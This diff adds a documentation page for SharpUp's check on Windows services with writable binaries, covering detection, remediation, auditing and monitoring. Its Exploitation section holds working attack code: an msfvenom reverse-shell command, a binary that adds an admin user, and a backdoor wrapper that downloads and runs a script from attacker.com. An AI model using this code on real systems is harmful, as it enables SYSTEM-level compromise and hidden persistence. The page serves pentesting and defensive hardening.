@@ -1,0 +1,415 @@
+---
+title: 'Modifiable Service Binaries'
+description: 'Service executable files with weak permissions'
+icon: 'file-binary'
+---
+
+## Overview
+
+The Modifiable Service Binaries check identifies Windows services where the service executable or DLL has weak file permissions. If a non-privileged user can modify a service binary, they can replace it with malicious code that will execute with the service's privileges (often SYSTEM).
+
+## How It Works
+
+SharpUp enumerates all services via WMI and checks if their binary paths are writable:
+
+1. Query all services using `Win32_Service`
+2. Extract the executable path from `PathName`
+3. Check if current user can modify the binary file
+4. Report vulnerable services with their state and startup mode
+
+### Technical Details
+
+```csharp
+// Simplified logic
+foreach (service in Get-Services()) {
+    string binaryPath = ExtractExePath(service.PathName);
+    if (CanModifyFile(binaryPath)) {
+        Report(service.Name, service.State, service.StartMode, binaryPath);
+    }
+}
+```
+
+The check uses regex to extract the executable path from service `PathName`, which may include arguments.
+
+## Example Output
+
+```
+=== Modifiable Service Binaries ===
+    Service 'VulnSvc' (State: Running, StartMode: Automatic) : C:\Program Files\VulnApp\service.exe
+    Service 'BackupService' (State: Stopped, StartMode: Manual) : C:\Services\backup.exe
+```
+
+**Interpretation:**
+- VulnSvc is currently running and starts automatically
+- You can modify C:\Program Files\VulnApp\service.exe
+- Restarting the service will execute your modified binary with service privileges
+
+## Exploitation
+
+### Method 1: Direct Binary Replacement
+
+```powershell
+# Backup original binary
+$servicePath = "C:\Program Files\VulnApp\service.exe"
+Copy-Item $servicePath "$servicePath.bak"
+
+# Create malicious binary (using msfvenom)
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o malicious.exe
+
+# Replace service binary
+Copy-Item C:\temp\malicious.exe $servicePath -Force
+
+# Restart service
+Restart-Service -Name VulnSvc
+
+# Or if service is stopped and set to Automatic, reboot
+shutdown /r /t 0
+```
+
+### Method 2: Add Local Admin
+
+```powershell
+# Create executable that adds user to administrators
+$code = @"
+using System;
+using System.Diagnostics;
+
+namespace AddAdmin {
+    class Program {
+        static void Main() {
+            Process.Start("cmd.exe", "/c net user hacker P@ssw0rd123! /add");
+            Process.Start("cmd.exe", "/c net localgroup administrators hacker /add");
+        }
+    }
+}
+"@
+
+Add-Type -TypeDefinition $code -OutputAssembly "C:\temp\addadmin.exe"
+
+# Replace service binary
+Copy-Item "C:\temp\addadmin.exe" "C:\Program Files\VulnApp\service.exe" -Force
+
+# Restart service
+net stop VulnSvc
+net start VulnSvc
+```
+
+### Method 3: Service Binary as Backdoor
+
+```powershell
+# Create service binary that runs payload then original service
+$wrapper = @"
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    // Run malicious payload
+    system("powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload')");
+
+    // Run original service
+    STARTUPINFO si = {sizeof(si)};
+    PROCESS_INFORMATION pi;
+    CreateProcess("C:\\Program Files\\VulnApp\\service.exe.bak", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+    return 0;
+}
+"@
+
+# Compile wrapper, replace service binary
+# Service appears to work normally but also runs your payload
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Identify Vulnerable Binaries">
+    ```powershell
+    # Check permissions on service binaries
+    Get-WmiObject Win32_Service | ForEach-Object {
+        if ($_.PathName -match '(.+\.exe)') {
+            $exePath = $matches[1].Trim('"')
+            if (Test-Path $exePath) {
+                $acl = Get-Acl $exePath
+                $vulnerableAcls = $acl.Access | Where-Object {
+                    $_.IdentityReference -match "Users|Everyone|Authenticated Users" -and
+                    $_.FileSystemRights -match "Write|Modify|FullControl"
+                }
+
+                if ($vulnerableAcls) {
+                    Write-Host "[!] Vulnerable: $($_.Name)" -ForegroundColor Red
+                    Write-Host "    Binary: $exePath"
+                    $vulnerableAcls | ForEach-Object {
+                        Write-Host "    $($_.IdentityReference) : $($_.FileSystemRights)"
+                    }
+                }
+            }
+        }
+    }
+    ```
+  </Step>
+
+  <Step title="Fix Binary Permissions">
+    ```powershell
+    # Set secure permissions on service binary
+    $serviceBinary = "C:\Program Files\VulnApp\service.exe"
+
+    # Reset permissions
+    icacls $serviceBinary /reset
+    icacls $serviceBinary /inheritance:r
+
+    # Grant appropriate access
+    icacls $serviceBinary /grant:r "SYSTEM:F"
+    icacls $serviceBinary /grant:r "Administrators:F"
+    icacls $serviceBinary /grant:r "Users:RX"
+
+    Write-Host "[+] Secured: $serviceBinary"
+    ```
+  </Step>
+
+  <Step title="Fix Parent Directory Permissions">
+    ```powershell
+    # Also secure the parent directory to prevent replacement
+    $serviceDir = Split-Path $serviceBinary
+
+    icacls $serviceDir /inheritance:r
+    icacls $serviceDir /grant:r "SYSTEM:(OI)(CI)F"
+    icacls $serviceDir /grant:r "Administrators:(OI)(CI)F"
+    icacls $serviceDir /grant:r "Users:(OI)(CI)RX"
+    ```
+  </Step>
+
+  <Step title="Bulk Remediation Script">
+    ```powershell
+    # Fix all vulnerable service binaries
+    Get-WmiObject Win32_Service | ForEach-Object {
+        if ($_.PathName -match '(.+\.exe)') {
+            $exePath = $matches[1].Trim('"')
+
+            if (Test-Path $exePath) {
+                Write-Host "[*] Processing: $($_.Name)"
+
+                # Set permissions on binary
+                icacls $exePath /reset | Out-Null
+                icacls $exePath /inheritance:r | Out-Null
+                icacls $exePath /grant:r "SYSTEM:F" | Out-Null
+                icacls $exePath /grant:r "Administrators:F" | Out-Null
+                icacls $exePath /grant:r "Users:RX" | Out-Null
+
+                Write-Host "[+] Secured: $exePath"
+            }
+        }
+    }
+    ```
+  </Step>
+
+  <Step title="Verify Fix">
+    ```bash
+    # Re-run check
+    SharpUp.exe ModifiableServiceBinaries
+    ```
+  </Step>
+</Steps>
+
+### Recommended Permissions
+
+**For service binaries:**
+- **SYSTEM:** Full Control
+- **Administrators:** Full Control
+- **Users:** Read & Execute only
+- **TrustedInstaller:** Full Control (for system services)
+
+**Inheritance:** Disabled (permissions explicitly set)
+
+## Detection
+
+### Defensive Monitoring
+
+```powershell
+# Monitor file modifications to service binaries
+$services = Get-WmiObject Win32_Service
+foreach ($service in $services) {
+    if ($service.PathName -match '(.+\.exe)') {
+        $exePath = $matches[1].Trim('"')
+
+        if (Test-Path $exePath) {
+            # Enable auditing
+            $acl = Get-Acl $exePath
+            $auditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
+                "Everyone",
+                "WriteData,AppendData,WriteAttributes",
+                "None",
+                "None",
+                "Success,Failure"
+            )
+            $acl.AddAuditRule($auditRule)
+            Set-Acl $exePath $acl
+        }
+    }
+}
+
+# Monitor Event ID 4663 for file modifications
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4663} |
+Where-Object {$_.Message -match '\.exe' -and $_.Message -match 'WriteData|AppendData'}
+```
+
+### Detection Strategies
+
+<Tabs>
+  <Tab title="File Integrity Monitoring">
+    - Baseline all service binaries with cryptographic hashes
+    - Alert on any modifications to service executables
+    - Monitor file creation in service directories
+    - Track file replacement activities
+  </Tab>
+
+  <Tab title="Permission Monitoring">
+    - Regularly audit service binary permissions
+    - Alert on permission changes to service files
+    - Monitor ACL modifications
+    - Track who accesses service binaries
+  </Tab>
+
+  <Tab title="Service Monitoring">
+    - Monitor service restarts (Event ID 7036)
+    - Alert on service crashes after restart
+    - Track service binary hash changes
+    - Monitor unusual service behavior
+  </Tab>
+
+  <Tab title="Process Monitoring">
+    - Monitor services spawning unexpected child processes
+    - Alert on cmd.exe or powershell.exe from services
+    - Track network connections from service processes
+    - Detect privilege escalation patterns
+  </Tab>
+</Tabs>
+
+## Real-World Scenarios
+
+<AccordionGroup>
+  <Accordion title="Scenario 1: Legacy Application Service">
+    **Context:** Legacy application installed to `C:\Apps` with weak permissions. Service runs as LocalSystem.
+
+    **Attack Path:**
+    1. Standard user identifies modifiable service binary
+    2. Replaces binary with malicious version
+    3. Waits for service restart or triggers it
+    4. Malicious code runs as SYSTEM
+    5. Complete system compromise
+
+    **Prevention:**
+    - Install applications to Program Files
+    - Use proper installer that sets correct permissions
+    - Regular permission audits
+  </Accordion>
+
+  <Accordion title="Scenario 2: Third-Party Monitoring Agent">
+    **Context:** Third-party monitoring agent has automatic updates that leave temporary files with weak permissions.
+
+    **Impact:**
+    - Attacker replaces agent binary during update
+    - Agent runs on schedule with SYSTEM privileges
+    - Lateral movement across all systems with agent installed
+
+    **Solution:**
+    - Work with vendor to fix installer
+    - Monitor agent directory for unauthorized changes
+    - Use application whitelisting
+  </Accordion>
+
+  <Accordion title="Scenario 3: Custom IT Service">
+    **Context:** IT team created custom service for automation, installed to `C:\Scripts` with Users having modify rights.
+
+    **Risk:**
+    - Any user can replace service binary
+    - Service runs hourly as SYSTEM
+    - Easy privilege escalation vector
+
+    **Fix:**
+    - Move to Program Files\CustomService
+    - Set proper permissions (Users read-only)
+    - Review service account permissions
+  </Accordion>
+</AccordionGroup>
+
+## Prevention Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Install to Program Files" icon="folder">
+    Always install services and applications to protected system directories.
+  </Card>
+  <Card title="Use Proper Installers" icon="box">
+    Use Windows Installer (MSI) which sets correct permissions by default.
+  </Card>
+  <Card title="Principle of Least Privilege" icon="user-shield">
+    Run services with minimum required privileges, not SYSTEM when possible.
+  </Card>
+  <Card title="Regular Audits" icon="magnifying-glass">
+    Periodically audit service binary permissions across all systems.
+  </Card>
+</CardGroup>
+
+### Automated Audit Script
+
+```powershell
+# Regular audit script - run via scheduled task
+$report = @()
+
+Get-WmiObject Win32_Service | ForEach-Object {
+    if ($_.PathName -match '(.+\.exe)') {
+        $exePath = $matches[1].Trim('"')
+
+        if (Test-Path $exePath) {
+            $acl = Get-Acl $exePath
+            $vulnerable = $acl.Access | Where-Object {
+                $_.IdentityReference -match "Users|Everyone|Authenticated Users" -and
+                $_.FileSystemRights -match "Write|Modify|FullControl" -and
+                $_.AccessControlType -eq "Allow"
+            }
+
+            if ($vulnerable) {
+                $report += [PSCustomObject]@{
+                    ServiceName = $_.Name
+                    Binary = $exePath
+                    State = $_.State
+                    StartMode = $_.StartMode
+                    VulnerableACE = ($vulnerable | Select-Object -ExpandProperty IdentityReference) -join ", "
+                }
+            }
+        }
+    }
+}
+
+if ($report) {
+    $report | Export-Csv "C:\Audits\VulnerableServiceBinaries_$(Get-Date -Format yyyyMMdd).csv" -NoTypeInformation
+    Send-MailMessage -To "security@company.com" -Subject "Vulnerable Service Binaries Found" -Body "See attached report" -Attachments "C:\Audits\VulnerableServiceBinaries_$(Get-Date -Format yyyyMMdd).csv"
+}
+```
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Modifiable Services" icon="gear" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableservices">
+    Services with weak DACL permissions
+  </Card>
+  <Card title="Modifiable Service Registry Keys" icon="key" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableserviceregistrykeys">
+    Service registry keys with weak permissions
+  </Card>
+  <Card title="Unquoted Service Path" icon="quote-left" href="/ghostpack-docs/SharpUp-mdx/checks/unquotedservicepath">
+    Services with unquoted paths containing spaces
+  </Card>
+  <Card title="Remediation Guide" icon="shield" href="/ghostpack-docs/SharpUp-mdx/remediation">
+    Comprehensive remediation guidance
+  </Card>
+</CardGroup>
+
+## References
+
+<CardGroup cols={2}>
+  <Card title="MITRE ATT&CK" icon="book" href="https://attack.mitre.org/techniques/T1574/010/">
+    T1574.010 - Hijack Execution Flow: Services File Permissions Weakness
+  </Card>
+  <Card title="Microsoft Security" icon="book" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment">
+    Windows Security Policy Settings
+  </Card>
+</CardGroup>
